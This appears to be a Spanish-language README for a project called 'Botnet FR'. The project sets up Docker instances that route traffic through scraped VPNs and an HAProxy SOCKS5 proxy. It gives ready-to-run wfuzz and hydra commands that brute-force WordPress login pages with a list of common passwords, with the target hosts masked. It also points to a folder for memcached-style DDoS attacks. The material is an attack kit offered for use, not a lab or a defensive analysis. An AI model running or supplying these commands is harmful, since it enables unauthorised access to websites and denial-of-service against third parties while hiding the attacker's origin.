# Botnet FR


## Prerequisitos

#### DOCKER
https://docs.docker.com/install/

#### WFUZZ 
`pip install wfuzz`

#### HYDRA
`apt install hydra`

## Instrucciones
### 1. Scrap VPN
`python scrap_vpns.py`

### 2. Compilar imagen Docker
`./build.sh`

### 3. Iniciar instancias 
`./start.sh num_instancias`

### 4. Parar instancias en ejecución
`./stop.sh`


## Utilidades

### HAPROXY Status
* http://localhost:1936/haproxy?stats

### CURL mediante haproxy
* `curl --socks5 localhost:1337 ipconfig.co`

### Contenedores en ejecución
* `docker ps`

### Check alive SOCKS5 Proxy
* `echo 05010 | xxd -p -r | netcat -o /dev/stdout localhost 5001`

* `echo 050100030a676f6f676c652e636f6d0 | xxd -p -r | netcat -o /dev/stdout localhost 5001`


## Ataques de fuerza bruta

### WFUZZ
wfuzz -Z -p localhost:1337:SOCKS5 -t 10 -c -v -z file,500-worst-passwords.txt --hs "ERROR" -d 
"log=user&pwd=FUZZ" "http://*****/wp-login.php"
wfuzz --recipe bruteforce/wfuzz-recipe

### HYDRA
export HYDRA_PROXY=socks5://127.0.0.1:1337 ; hydra -I -Vv -l user -P bruteforce/500-worst-passwords.txt 
***.***.*** http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=302"

## Ataques DDOS
ver carpeta memcrashed
